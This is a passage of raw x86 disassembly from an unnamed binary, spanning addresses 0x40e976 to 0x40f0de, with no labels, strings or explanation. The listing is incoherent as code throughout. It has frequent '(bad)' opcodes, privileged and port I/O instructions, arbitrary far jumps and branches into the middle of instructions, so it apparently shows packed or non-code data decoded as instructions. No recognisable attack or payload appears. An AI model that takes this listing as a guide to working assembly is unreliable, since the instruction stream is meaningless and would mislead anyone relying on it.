  40e976:	sub    esp,DWORD PTR [eax]
  40e978:	sub    edi,DWORD PTR [edi-0x1a]
  40e97b:	jmp    0x40e994
  40e97d:	push   0x23d4ae92
  40e982:	stos   BYTE PTR es:[edi],al
  40e983:	mov    DWORD PTR [eax],ebx
  40e985:	daa    
  40e986:	sub    edi,esp
  40e988:	les    edi,FWORD PTR [ecx+0xc10c537]
  40e98e:	bound  edx,QWORD PTR [ebx-0x75]
  40e991:	sub    BYTE PTR [ecx],bl
  40e993:	out    dx,al
  40e994:	sbb    DWORD PTR [esi-0x3c],0xffffffc6
  40e998:	and    BYTE PTR [ebx+0x40],dl
  40e99b:	dec    ebp
  40e99c:	xor    BYTE PTR [edx],ch
  40e99e:	pop    ss
  40e99f:	daa    
  40e9a0:	mov    ds:0xffea45cb,al
  40e9a5:	sti    
  40e9a6:	loopne 0x40e96a
  40e9a8:	xchg   esi,eax
  40e9a9:	mov    esi,0x1881f353
  40e9ae:	mov    eax,0x203686b
  40e9b3:	sub    BYTE PTR [esi],dl
  40e9b5:	outs   dx,DWORD PTR ds:[esi]
  40e9b6:	bound  ebp,QWORD PTR [ecx]
  40e9b8:	(bad)  
  40e9b9:	hlt    
  40e9ba:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  40e9bc:	outs   dx,BYTE PTR ds:[esi]
  40e9bd:	(bad)  
  40e9be:	sub    al,0xb9
  40e9c0:	jns    0x40e9c9
  40e9c2:	clc    
  40e9c3:	jle    0x40ea39
  40e9c5:	and    DWORD PTR [eax-0x696aaba6],0x23
  40e9cc:	push   edi
  40e9cd:	(bad)  [ebx+ebp*1+0x53d2dc48]
  40e9d4:	out    dx,eax
  40e9d5:	lahf   
  40e9d6:	dec    esp
  40e9d7:	adc    al,0x6e
  40e9d9:	push   edi
  40e9da:	adc    BYTE PTR [ebx+0x40],dl
  40e9dd:	mov    esp,0x73683967
  40e9e2:	xchg   esi,eax
  40e9e3:	retf   0x2763
  40e9e6:	sbb    DWORD PTR [esi],edx
  40e9e8:	aas    
  40e9e9:	dec    esi
  40e9ea:	shr    BYTE PTR [eax-0x68e1961e],1
  40e9f0:	mov    ch,0x98
  40e9f2:	retf   
  40e9f3:	lds    ebx,FWORD PTR [ecx-0x39]
  40e9f6:	lahf   
  40e9f7:	mov    al,0xd0
  40e9f9:	imul   eax,esi,0x97605a9f
  40e9ff:	pop    esi
  40ea00:	cmp    eax,0xba6269f3
  40ea05:	push   esp
  40ea06:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ea07:	mov    ebx,0xc4c8d114
  40ea0c:	int3   
  40ea0d:	push   cs
  40ea0e:	add    DWORD PTR [ecx+ecx*1-0x271282],ebp
  40ea15:	aam    0xc6
  40ea17:	out    dx,al
  40ea18:	xor    al,0xc5
  40ea1a:	rcl    DWORD PTR [edx+0x6b],cl
  40ea1d:	and    BYTE PTR [eax+ecx*4-0x28],0xbb
  40ea22:	sbb    bl,0x5a
  40ea25:	sbb    eax,0xe6bcbdb3
  40ea2a:	sbb    ebx,edi
  40ea2c:	idiv   BYTE PTR [eax-0x4f]
  40ea2f:	ror    DWORD PTR ds:0x85cc4693,1
  40ea35:	arpl   WORD PTR [eax-0x23e88907],dx
  40ea3b:	lods   al,BYTE PTR ds:[esi]
  40ea3c:	inc    ebx
  40ea3d:	cmp    eax,0x1cfaa92
  40ea42:	loope  0x40ea68
  40ea44:	inc    ebp
  40ea45:	dec    ebp
  40ea46:	push   ss
  40ea47:	jne    0x40eaa7
  40ea49:	lods   eax,DWORD PTR ds:[esi]
  40ea4a:	xor    BYTE PTR [ecx-0x568a0c74],0x4d
  40ea51:	sbb    eax,0x28c7ff0f
  40ea56:	jnp    0x40ea53
  40ea58:	stc    
  40ea59:	lds    eax,FWORD PTR [eax+0x10]
  40ea5c:	inc    ebp
  40ea5d:	jbe    0x40e9e5
  40ea5f:	fdiv   QWORD PTR [ebx+ebx*1+0x66]
  40ea63:	ret    0x6bb4
  40ea66:	fstp   DWORD PTR [edi]
  40ea68:	fisubr WORD PTR [edi-0x16cbb89c]
  40ea6e:	push   0xa650d162
  40ea73:	cli    
  40ea74:	or     cl,BYTE PTR [ebx-0x3c3ccf24]
  40ea7a:	pop    ds
  40ea7b:	fidiv  WORD PTR [ebx+eax*8-0x116c5aef]
  40ea82:	mov    cl,0xd3
  40ea84:	pop    ds
  40ea85:	mov    ebp,0x11bed0f1
  40ea8a:	add    DWORD PTR [ecx-0x38],0xffffffae
  40ea8e:	push   es
  40ea8f:	push   edi
  40ea90:	pushf  
  40ea91:	pusha  
  40ea92:	mov    ds:0xb40607ea,eax
  40ea97:	inc    edx
  40ea98:	retf   
  40ea99:	dec    ecx
  40ea9a:	inc    esi
  40ea9b:	aas    
  40ea9c:	adc    bl,BYTE PTR [esi+0x11]
  40ea9f:	out    0x99,eax
  40eaa1:	mov    dh,0xeb
  40eaa3:	xchg   ecx,eax
  40eaa4:	fwait
  40eaa5:	ss (bad) 
  40eaa7:	shl    DWORD PTR [edx-0x5e],1
  40eaaa:	push   ds
  40eaab:	cmp    al,0xe0
  40eaad:	scas   eax,DWORD PTR es:[edi]
  40eaae:	cmp    eax,0x69ad5a82
  40eab3:	lahf   
  40eab4:	sbb    eax,0x363205d3
  40eab9:	or     bh,BYTE PTR [ebx+0x20c58c86]
  40eabf:	jnp    0x40eb23
  40eac1:	cmp    dh,BYTE PTR [edx+eiz*4]
  40eac4:	not    BYTE PTR [ecx]
  40eac6:	sbb    DWORD PTR [edi-0x2b],esp
  40eac9:	mov    ds:0xfee6f946,al
  40eace:	fbstp  TBYTE PTR [esi+ecx*1+0x3e6d9d9b]
  40ead5:	mov    ecx,0x108d71bc
  40eada:	call   0x46a5:0x601c7243
  40eae1:	inc    ebx
  40eae2:	mov    esi,0x2e01e2b3
  40eae7:	xchg   ecx,eax
  40eae8:	jmp    0xbc314428
  40eaed:	push   ebx
  40eaee:	out    0xca,al
  40eaf0:	fld    TBYTE PTR [edx+0x51]
  40eaf3:	pop    ecx
  40eaf4:	inc    esi
  40eaf5:	sbb    eax,0x7fd07703
  40eafa:	rcr    DWORD PTR [ecx],1
  40eafc:	cmc    
  40eafd:	inc    edx
  40eafe:	les    esi,FWORD PTR [esi-0x7]
  40eb01:	aam    0x5d
  40eb03:	add    dh,BYTE PTR [edi]
  40eb05:	test   al,0x67
  40eb07:	test   al,0x98
  40eb09:	cli    
  40eb0a:	div    BYTE PTR [ecx]
  40eb0c:	adc    esi,DWORD PTR [edx+0xb]
  40eb0f:	mov    esp,0xfc55397c
  40eb14:	xor    DWORD PTR [ecx+0x17],edi
  40eb17:	xor    BYTE PTR [edx],ch
  40eb19:	add    eax,0x6f51b9cd
  40eb1e:	xchg   BYTE PTR [ebp+0x7836f725],ch
  40eb24:	sub    BYTE PTR [esi+esi*8-0x6838cee],cl
  40eb2b:	test   DWORD PTR [edx+0x1140a10],0x3f13a44b
  40eb35:	daa    
  40eb36:	je     0x40ebb5
  40eb38:	pop    ebx
  40eb39:	jns    0x40ebb3
  40eb3b:	ins    BYTE PTR es:[edi],dx
  40eb3c:	clc    
  40eb3d:	push   cs
  40eb3e:	jmp    0xcec9:0x883ab161
  40eb45:	cmp    DWORD PTR [ebp-0x7],ebx
  40eb48:	xchg   edx,eax
  40eb49:	mov    esp,0x12404703
  40eb4e:	cmp    BYTE PTR [ecx],bh
  40eb50:	xor    ah,BYTE PTR [edi+0x6355449d]
  40eb56:	cmp    edi,edi
  40eb58:	test   eax,0x21a45c8d
  40eb5d:	pop    DWORD PTR [eax+0x7865ec34]
  40eb63:	lods   eax,DWORD PTR ds:[esi]
  40eb64:	jp     0x40eb38
  40eb66:	mov    ah,0xf7
  40eb68:	sbb    eax,0x46e4c242
  40eb6d:	fisubr WORD PTR [edi+0x5e]
  40eb70:	push   esi
  40eb71:	or     ebp,edi
  40eb73:	push   ebx
  40eb74:	ja     0x40eb5b
  40eb76:	das    
  40eb77:	adc    eax,ebx
  40eb79:	int3   
  40eb7a:	add    BYTE PTR [ebp-0x63917c23],bh
  40eb80:	lods   eax,DWORD PTR ds:[esi]
  40eb81:	es mov bl,ch
  40eb84:	push   eax
  40eb85:	jne    0x40eb46
  40eb87:	(bad)  
  40eb8a:	fisttp QWORD PTR [ecx+0x6f6c6392]
  40eb90:	(bad)  
  40eb92:	xor    bl,ch
  40eb94:	call   0xde41:0xba2d1400
  40eb9b:	aaa    
  40eb9c:	shl    DWORD PTR [edi+0x17],cl
  40eb9f:	adc    al,0x38
  40eba1:	test   ebp,0x77c210c
  40eba7:	mov    ch,0xf9
  40eba9:	sub    ebx,DWORD PTR [ecx-0x30ea8042]
  40ebaf:	test   eax,0x62ad12bb
  40ebb4:	jae    0x40eb7d
  40ebb6:	(bad)  
  40ebb9:	cli    
  40ebba:	pop    ebx
  40ebbb:	inc    ebx
  40ebbc:	cmp    al,0xa8
  40ebbe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ebbf:	xor    eax,0x5c4ef260
  40ebc4:	cs in  eax,dx
  40ebc6:	xor    edi,ebp
  40ebc8:	mul    BYTE PTR [eax+0x22876901]
  40ebce:	stos   DWORD PTR es:[edi],eax
  40ebcf:	out    dx,al
  40ebd0:	or     eax,0xc445c8a2
  40ebd5:	add    DWORD PTR [eax+0x35],ecx
  40ebd8:	and    al,0xfa
  40ebda:	add    DWORD PTR [ecx+0x2a3f6440],esp
  40ebe0:	xchg   esp,eax
  40ebe1:	pusha  
  40ebe2:	push   ss
  40ebe3:	adc    bl,BYTE PTR [eax+0xb0768b1]
  40ebe9:	and    ah,cl
  40ebeb:	push   ecx
  40ebec:	pop    ebx
  40ebed:	push   ss
  40ebee:	push   ecx
  40ebef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ebf0:	in     al,dx
  40ebf1:	push   edx
  40ebf2:	dec    edi
  40ebf3:	push   0x77dc46c6
  40ebf8:	gs js  0x40ec29
  40ebfb:	rcl    ecx,0x15
  40ebfe:	or     al,0x7a
  40ec00:	inc    ecx
  40ec01:	jp     0x40ec59
  40ec03:	sub    al,dh
  40ec05:	retf   0xebcc
  40ec08:	push   edi
  40ec09:	cmp    BYTE PTR [edi],0x1d
  40ec0c:	jle    0x40ebcd
  40ec0e:	push   esi
  40ec0f:	aam    0x28
  40ec11:	fwait
  40ec12:	dec    edi
  40ec13:	repz cmc 
  40ec15:	dec    ecx
  40ec16:	repz or DWORD PTR ds:0xe69b657,ebp
  40ec1d:	scas   al,BYTE PTR es:[edi]
  40ec1e:	push   ds
  40ec1f:	cmp    ah,BYTE PTR [ecx+0x2a9947b]
  40ec25:	adc    al,0x17
  40ec27:	add    ebp,ebx
  40ec29:	adc    eax,0x2be2bb02
  40ec2e:	mov    dh,0xb3
  40ec30:	imul   esi,DWORD PTR [edx+0x70f5d7f5],0x1a97e590
  40ec3a:	ins    BYTE PTR es:[edi],dx
  40ec3b:	ret    
  40ec3c:	xor    ah,BYTE PTR [ecx+esi*1]
  40ec3f:	adc    esp,DWORD PTR [eax-0x59]
  40ec42:	push   eax
  40ec43:	mov    dh,0x10
  40ec45:	aad    0x86
  40ec47:	mov    DWORD PTR [esp+esi*2],ebx
  40ec4a:	sbb    eax,0x4f5a5044
  40ec4f:	daa    
  40ec50:	inc    esp
  40ec51:	in     eax,dx
  40ec52:	stos   BYTE PTR es:[edi],al
  40ec53:	aas    
  40ec54:	loopne 0x40ebee
  40ec56:	dec    esi
  40ec57:	les    ebx,FWORD PTR [eax+eiz*8+0x57]
  40ec5b:	test   al,0x82
  40ec5d:	adc    cl,BYTE PTR [ebx]
  40ec5f:	jbe    0x40ecb2
  40ec61:	mov    ebp,0x304a5a11
  40ec66:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ec67:	pop    edi
  40ec68:	les    edx,FWORD PTR [ebx+0x12]
  40ec6b:	mov    edi,0x543841d9
  40ec70:	in     al,0xf7
  40ec72:	sub    eax,ebx
  40ec74:	scas   eax,DWORD PTR es:[edi]
  40ec75:	fdiv   DWORD PTR [bp+si+0x60a7]
  40ec7a:	push   ecx
  40ec7b:	mov    ds:0xb67a0a7e,eax
  40ec80:	das    
  40ec81:	stc    
  40ec82:	popf   
  40ec83:	popf   
  40ec84:	pop    es
  40ec85:	stos   WORD PTR es:[edi],ax
  40ec87:	out    0xf7,eax
  40ec89:	std    
  40ec8a:	outs   dx,DWORD PTR ds:[esi]
  40ec8b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ec8c:	dec    ecx
  40ec8d:	xchg   BYTE PTR [ecx+0x10e67334],cl
  40ec93:	mov    cl,0xba
  40ec95:	and    dh,0x44
  40ec98:	ret    0xc62e
  40ec9b:	gs (bad) 
  40ec9e:	(bad)  
  40ec9f:	test   DWORD PTR ds:0x6f182857,ecx
  40eca5:	js     0x40eca7
  40eca7:	mov    DWORD PTR [ecx+0x57197d56],eax
  40ecad:	push   ebp
  40ecae:	push   ebp
  40ecaf:	sbb    edi,esi
  40ecb1:	fcmovu st,st(4)
  40ecb3:	cwde   
  40ecb4:	dec    ebp
  40ecb5:	jo     0x40ec67
  40ecb7:	pop    ds
  40ecb8:	int    0xe7
  40ecba:	sbb    al,0xf1
  40ecbc:	push   0x9f2a385b
  40ecc1:	sbb    al,bh
  40ecc3:	and    ebx,eax
  40ecc5:	jle    0x40ed34
  40ecc7:	out    dx,al
  40ecc8:	add    al,0x95
  40ecca:	cwde   
  40eccb:	cmp    bh,dh
  40eccd:	rol    edi,1
  40eccf:	xchg   ebp,eax
  40ecd0:	sub    ch,BYTE PTR [ecx+0x7dd7cce3]
  40ecd6:	sub    al,0xe4
  40ecd8:	or     al,BYTE PTR ds:[edx+0x6dc70726]
  40ecdf:	xor    BYTE PTR [edx],0x62
  40ece2:	int3   
  40ece3:	jg     0x40ecf3
  40ece5:	fdivr  QWORD PTR [ebp+0x4ce360fd]
  40eceb:	mov    esi,0xe7ca421a
  40ecf0:	sbb    cl,0xc0
  40ecf3:	arpl   WORD PTR [edx],sp
  40ecf5:	fild   WORD PTR [ecx-0x65f04f7e]
  40ecfb:	clc    
  40ecfc:	mov    dl,0xa8
  40ecfe:	dec    ebx
  40ecff:	add    al,al
  40ed01:	dec    ecx
  40ed02:	or     eax,0x18610ad5
  40ed07:	outs   dx,BYTE PTR ds:[esi]
  40ed08:	inc    edi
  40ed09:	jle    0x40eccf
  40ed0b:	mov    edi,0x9824ac3f
  40ed10:	mov    esp,0x3533f57
  40ed15:	dec    ecx
  40ed16:	call   DWORD PTR [ebp+0x47]
  40ed19:	xor    ebp,DWORD PTR [edx]
  40ed1b:	jmp    0xe33a7815
  40ed20:	scas   eax,DWORD PTR es:[edi]
  40ed21:	push   ebx
  40ed22:	and    ch,BYTE PTR [esi-0x22c5a964]
  40ed28:	push   ebp
  40ed29:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ed2a:	sti    
  40ed2b:	ja     0x40ed18
  40ed2d:	das    
  40ed2e:	add    eax,0xcc7388d6
  40ed33:	jns    0x40edae
  40ed35:	out    0x90,al
  40ed37:	in     eax,0xe
  40ed39:	jae    0x40ed4b
  40ed3b:	jmp    0x5c83dca0
  40ed40:	jmp    0x8152:0x6ca424ba
  40ed47:	mov    eax,cs:0x248d72a9
  40ed4d:	rcr    DWORD PTR [eax-0x34],1
  40ed50:	xchg   esp,eax
  40ed51:	pusha  
  40ed52:	mov    ch,0xdf
  40ed54:	pop    ss
  40ed55:	sbb    ecx,DWORD PTR [edi]
  40ed57:	fldenv [esi-0x23]
  40ed5a:	pop    edi
  40ed5b:	leave  
  40ed5c:	mov    ch,0x7b
  40ed5e:	dec    ecx
  40ed5f:	sub    edx,DWORD PTR [edi+ecx*4-0xccc8931]
  40ed66:	add    eax,0x4a63a170
  40ed6b:	scas   al,BYTE PTR es:[edi]
  40ed6c:	jp     0x40ed1b
  40ed6e:	mov    dl,0x77
  40ed70:	pop    ds
  40ed71:	iret   
  40ed72:	cmp    DWORD PTR [ecx+eiz*1-0x7d],ebp
  40ed76:	sbb    cl,dl
  40ed78:	mul    edx
  40ed7a:	popa   
  40ed7b:	cmp    eax,0x148a61c
  40ed80:	mov    edi,0x78af2dc
  40ed85:	nop
  40ed86:	mov    bh,0xc7
  40ed88:	mov    esi,0x22b05cf3
  40ed8d:	or     edx,esi
  40ed8f:	or     dh,BYTE PTR [esi+ecx*8]
  40ed92:	adc    BYTE PTR [ebp+0x7a],ah
  40ed95:	mov    al,ds:0x90474c8b
  40ed9a:	sbb    ah,bh
  40ed9c:	or     esp,esp
  40ed9e:	cmp    al,BYTE PTR [ebp-0x2ea03c78]
  40eda4:	cdq    
  40eda5:	push   edi
  40eda6:	inc    ebp
  40eda7:	ins    BYTE PTR es:[edi],dx
  40eda8:	js     0x40ed2e
  40edaa:	xor    eax,0xeb807529
  40edaf:	xchg   edx,eax
  40edb0:	cmc    
  40edb1:	inc    ebx
  40edb2:	mov    dl,0x2d
  40edb4:	fistp  QWORD PTR ss:[ebx+0x18db337e]
  40edbb:	push   0x29b9391a
  40edc0:	or     edi,DWORD PTR [bx+si+0x430a]
  40edc5:	clc    
  40edc6:	or     eax,0xcf6299b5
  40edcb:	xor    eax,0xed863b81
  40edd0:	mov    ebx,0xcd0ccdc2
  40edd5:	and    esp,DWORD PTR [edi-0x5ac1f17c]
  40eddb:	fiadd  DWORD PTR [ebp+0x33f0a172]
  40ede1:	popa   
  40ede2:	push   0x37
  40ede4:	imul   ebp,ecx,0x10
  40ede7:	xrelease xchg BYTE PTR [esi+0x292278c9],bh
  40edee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40edef:	fcomp  QWORD PTR [edx+0x4f]
  40edf2:	mov    dh,ah
  40edf4:	mov    ds:0x8abfda7f,al
  40edf9:	rcr    DWORD PTR [eax+0x29af72cd],0xe3
  40ee00:	hlt    
  40ee01:	add    DWORD PTR [ebx*2-0x5b0d00df],ecx
  40ee08:	loope  0x40ee23
  40ee0a:	sbb    edx,DWORD PTR [edx]
  40ee0c:	lds    ebp,FWORD PTR [esi]
  40ee0e:	je     0x40eda7
  40ee10:	mov    ch,BYTE PTR [esi-0x3a]
  40ee13:	mov    esp,0x716be7c7
  40ee18:	stos   DWORD PTR es:[edi],eax
  40ee19:	mov    dl,0x7e
  40ee1b:	add    DWORD PTR ds:0x3896096c,eax
  40ee21:	in     eax,dx
  40ee22:	pop    eax
  40ee23:	(bad)  
  40ee24:	add    cl,BYTE PTR [bx+si-0xed]
  40ee29:	(bad)  
  40ee2a:	jp     0x40edf3
  40ee2c:	outs   dx,BYTE PTR ds:[esi]
  40ee2d:	sahf   
  40ee2e:	(bad)  
  40ee2f:	pop    ss
  40ee30:	test   al,0x31
  40ee32:	dec    esi
  40ee33:	call   DWORD PTR [esi+0x3]
  40ee36:	mov    ah,0xed
  40ee38:	fs out dx,eax
  40ee3a:	leave  
  40ee3b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ee3c:	mov    eax,0xfcbe68f4
  40ee41:	sub    eax,0x3e710450
  40ee46:	or     eax,0x6bf9fb0b
  40ee4b:	das    
  40ee4c:	add    eax,0xc0442d60
  40ee51:	outs   dx,DWORD PTR cs:[esi]
  40ee53:	imul   ebx,DWORD PTR ds:0x4e857033,0x73
  40ee5a:	gs retf 
  40ee5c:	xchg   edi,eax
  40ee5d:	sar    DWORD PTR [edx],cl
  40ee5f:	sbb    eax,0xcee89ff
  40ee64:	out    0x53,eax
  40ee66:	mul    BYTE PTR [ebp-0xa]
  40ee69:	inc    BYTE PTR [eax-0x2a]
  40ee6c:	int    0x40
  40ee6e:	mov    ch,0x2e
  40ee70:	iret   
  40ee71:	jp     0x40ee05
  40ee73:	data16 (bad) 
  40ee76:	sbb    eax,0xb93f912c
  40ee7b:	mov    edx,0x8d11f9f3
  40ee80:	aad    0x83
  40ee82:	mov    eax,0x176b03c2
  40ee87:	sub    BYTE PTR [ebx+0x14],0x51
  40ee8b:	mov    al,ds:0xa3572215
  40ee90:	xor    dl,ah
  40ee92:	call   ecx
  40ee94:	into   
  40ee95:	pop    es
  40ee96:	cmp    ah,cl
  40ee98:	hlt    
  40ee99:	scas   al,BYTE PTR es:[edi]
  40ee9a:	xchg   DWORD PTR [edx-0xd],esp
  40ee9d:	ficom  WORD PTR [ecx-0x6c]
  40eea0:	retf   0x4c90
  40eea3:	in     al,dx
  40eea4:	xor    ah,BYTE PTR [edi-0x557d136a]
  40eeaa:	jne    0x40ee70
  40eeac:	push   edx
  40eead:	sbb    bl,BYTE PTR [esi+0xef96621]
  40eeb3:	mov    bh,0x5d
  40eeb5:	adc    bh,BYTE PTR [edi+0x1c]
  40eeb8:	mov    BYTE PTR [ebp+0x6a],bh
  40eebb:	inc    ebx
  40eebc:	jae    0x40ee99
  40eebe:	and    ah,0xe3
  40eec1:	in     eax,dx
  40eec2:	in     eax,dx
  40eec3:	loope  0x40eec7
  40eec5:	push   0x21989005
  40eeca:	jp     0x40ee7c
  40eecc:	popa   
  40eecd:	out    dx,al
  40eece:	mov    edi,cs
  40eed0:	rcr    BYTE PTR es:[ecx-0x17b104fe],0x89
  40eed8:	push   eax
  40eed9:	shl    BYTE PTR [ebx-0x44],0x18
  40eedd:	ja     0x40ef4f
  40eedf:	add    BYTE PTR [eax],0x97
  40eee2:	add    al,ah
  40eee4:	out    dx,eax
  40eee5:	imul   ebx,DWORD PTR [ebp+0x5e589b31],0xe3462dd8
  40eeef:	xor    eax,0xf30ab79a
  40eef4:	or     DWORD PTR [ebp-0x1911e38a],0xfffffff0
  40eefb:	js     0x40ef7c
  40eefd:	sbb    BYTE PTR [edx-0x6d],bl
  40ef00:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ef01:	into   
  40ef02:	cmp    esp,ecx
  40ef04:	sub    eax,0xa98f1675
  40ef09:	push   ebp
  40ef0a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ef0b:	push   esp
  40ef0c:	inc    eax
  40ef0d:	inc    esp
  40ef0e:	imul   eax,DWORD PTR [edx],0x1f2215d7
  40ef14:	add    ebp,edi
  40ef16:	push   ecx
  40ef17:	in     eax,dx
  40ef18:	xchg   edi,eax
  40ef19:	stos   DWORD PTR es:[edi],eax
  40ef1a:	dec    ebx
  40ef1b:	xchg   ecx,eax
  40ef1c:	push   eax
  40ef1d:	xchg   edi,eax
  40ef1e:	add    BYTE PTR [edx+0x703429ed],al
  40ef24:	pop    esp
  40ef25:	fistp  DWORD PTR [edi-0x6a946f24]
  40ef2b:	jb     0x40ef73
  40ef2d:	mov    esp,0x663ed480
  40ef32:	dec    ebp
  40ef33:	das    
  40ef34:	sahf   
  40ef35:	sub    ch,BYTE PTR [ebp+eiz*1+0x15b4c5f4]
  40ef3c:	ret    
  40ef3d:	mov    edi,DWORD PTR [eax]
  40ef3f:	inc    BYTE PTR [edx-0x3c]
  40ef42:	popa   
  40ef43:	popa   
  40ef44:	mov    al,ds:0xf938f2a
  40ef49:	mov    BYTE PTR [ebx+0x39cec581],dh
  40ef4f:	cmp    eax,0xe0f2aea8
  40ef54:	push   0x28
  40ef56:	push   eax
  40ef57:	loope  0x40ef06
  40ef59:	sub    DWORD PTR [edx+0x2d],ebx
  40ef5c:	push   es
  40ef5d:	(bad)  
  40ef5e:	cli    
  40ef5f:	xor    eax,0x32c070da
  40ef64:	cdq    
  40ef65:	idiv   DWORD PTR [edx]
  40ef67:	jmp    0xa667:0x41cca37a
  40ef6e:	jg     0x40ef2c
  40ef70:	mov    edx,?
  40ef72:	mov    WORD PTR [edi],?
  40ef74:	loope  0x40eff4
  40ef76:	push   edi
  40ef77:	mov    ds:0xd6da52c0,al
  40ef7c:	mov    ch,0x16
  40ef7e:	xchg   ebp,eax
  40ef7f:	pusha  
  40ef80:	ret    
  40ef81:	popa   
  40ef82:	pop    ebp
  40ef83:	mov    edx,DWORD PTR [eax-0x48]
  40ef86:	jae    0x40ef78
  40ef88:	(bad)  
  40ef89:	shr    BYTE PTR [esi+ecx*4-0x1c],cl
  40ef8d:	xchg   ecx,eax
  40ef8e:	test   al,0x6
  40ef90:	test   DWORD PTR ds:0x70a08d9b,edi
  40ef96:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ef97:	aaa    
  40ef98:	push   ecx
  40ef99:	test   eax,0xd23bfcfe
  40ef9e:	mov    ch,0xe6
  40efa0:	cmp    ebp,DWORD PTR [esi+0xa]
  40efa3:	(bad)  
  40efa4:	fidiv  DWORD PTR [ebx+eiz*2-0x2d793258]
  40efab:	shl    DWORD PTR [edx+0x25],0xe7
  40efaf:	xor    edi,edx
  40efb1:	es popa 
  40efb3:	cmp    eax,0xdf765e6e
  40efb8:	aad    0xa7
  40efba:	mov    al,0xf
  40efbc:	outs   dx,BYTE PTR ds:[esi]
  40efbd:	idiv   DWORD PTR [esi+eax*1]
  40efc0:	sub    eax,0x39619a87
  40efc5:	or     eax,0x6c228c8e
  40efca:	data16 popw ds
  40efcd:	leave  
  40efce:	clc    
  40efcf:	popf   
  40efd0:	sti    
  40efd1:	mov    cl,0x8a
  40efd3:	jl     0x40f041
  40efd5:	pop    eax
  40efd6:	test   edi,esi
  40efd8:	dec    eax
  40efd9:	inc    ebx
  40efda:	stos   DWORD PTR es:[edi],eax
  40efdb:	div    DWORD PTR [esi+edx*8+0x397fb568]
  40efe2:	jecxz  0x40f01c
  40efe4:	adc    eax,0x1a7d5eca
  40efe9:	pop    ss
  40efea:	int3   
  40efeb:	dec    edi
  40efec:	add    edi,DWORD PTR [edi]
  40efee:	cli    
  40efef:	jo     0x40ef83
  40eff1:	jmp    0x9d6c8b13
  40eff6:	mov    al,0x62
  40eff8:	and    esi,DWORD PTR [edx]
  40effa:	xor    BYTE PTR [eax-0x30bcb1b0],al
  40f000:	inc    ecx
  40f001:	test   al,cl
  40f003:	inc    eax
  40f004:	cmp    ebx,DWORD PTR [esi+edi*4+0x4f]
  40f008:	or     esp,DWORD PTR ds:0xbf1b9ebe
  40f00e:	inc    esi
  40f00f:	and    eax,0xfef80ee3
  40f014:	mov    edi,0xfc72da5b
  40f019:	inc    eax
  40f01a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f01b:	ins    BYTE PTR es:[edi],dx
  40f01c:	test   DWORD PTR [ebx],edi
  40f01e:	in     al,dx
  40f01f:	mov    edi,0xe3f2ac69
  40f024:	mov    dh,0x9a
  40f026:	ja     0x40f011
  40f028:	aaa    
  40f029:	fsub   DWORD PTR [edi+0x41565aa1]
  40f02f:	xchg   DWORD PTR [edi-0x3843b02],ebp
  40f035:	popa   
  40f036:	dec    edi
  40f037:	icebp  
  40f038:	xor    dl,bh
  40f03a:	into   
  40f03b:	sub    al,0xc8
  40f03d:	adc    eax,DWORD PTR [ebp-0x696967d0]
  40f043:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f044:	(bad)  
  40f046:	and    BYTE PTR [eax],al
  40f048:	out    dx,eax
  40f049:	mov    bl,BYTE PTR [ebp+0x63]
  40f04c:	add    DWORD PTR [ebp+ebx*2-0xf],ecx
  40f050:	mov    cl,0x73
  40f052:	mov    esi,0x90ebb25e
  40f057:	cmp    ebp,DWORD PTR [edi-0x44]
  40f05a:	jmp    0x40f029
  40f05c:	gs sbb eax,0xcc675d5b
  40f062:	mov    dl,0x68
  40f064:	aam    0xc
  40f066:	dec    edi
  40f067:	ins    BYTE PTR es:[edi],dx
  40f068:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f069:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f06a:	inc    edi
  40f06b:	cmp    DWORD PTR [edi+0x29443c89],ebp
  40f071:	xchg   edx,eax
  40f072:	jmp    0x510557cb
  40f077:	xchg   edx,eax
  40f078:	retf   0xfa0e
  40f07b:	shr    DWORD PTR [eax-0x31],1
  40f07e:	inc    ecx
  40f07f:	aam    0x97
  40f081:	bound  ebp,QWORD PTR [ebx+0x4d]
  40f084:	rol    DWORD PTR [ebx-0x7a],cl
  40f087:	adc    DWORD PTR [esi+0xf1ae08e],esi
  40f08d:	xchg   ebx,eax
  40f08e:	adc    edi,DWORD PTR [esi-0x29]
  40f091:	sub    eax,0x89e3d0cc
  40f096:	stos   BYTE PTR es:[edi],al
  40f097:	rcr    BYTE PTR [eax-0x79],1
  40f09a:	mov    ebx,0x96b11818
  40f09f:	std    
  40f0a0:	daa    
  40f0a1:	push   ebp
  40f0a2:	add    edi,DWORD PTR [ebp+0x28]
  40f0a5:	pop    ds
  40f0a6:	dec    ebx
  40f0a7:	xor    cl,BYTE PTR [edx+0x5a]
  40f0aa:	test   DWORD PTR [ebx-0x4f9341cc],edi
  40f0b0:	(bad)  
  40f0b1:	sbb    dh,dh
  40f0b3:	scas   al,BYTE PTR es:[edi]
  40f0b4:	dec    ebp
  40f0b5:	jno    0x40f0e1
  40f0b7:	shr    DWORD PTR [edi],cl
  40f0b9:	cmp    al,0x66
  40f0bb:	mov    dl,0xc9
  40f0bd:	add    eax,DWORD PTR [ecx+0x5a7a470c]
  40f0c3:	inc    edx
  40f0c4:	push   edi
  40f0c5:	fwait
  40f0c6:	out    dx,eax
  40f0c7:	cmc    
  40f0c8:	add    dl,BYTE PTR [esi]
  40f0ca:	js     0x40f0d3
  40f0cc:	sti    
  40f0cd:	mov    ebx,0x505dbad4
  40f0d2:	shl    ch,1
  40f0d4:	dec    edx
  40f0d5:	bound  ebx,QWORD PTR [ecx]
  40f0d7:	xor    ecx,ebp
  40f0d9:	ret    
  40f0da:	pop    es
  40f0db:	mov    dh,0x84
  40f0dd:	ins    BYTE PTR es:[edi],dx
  40f0de:	pop    ds
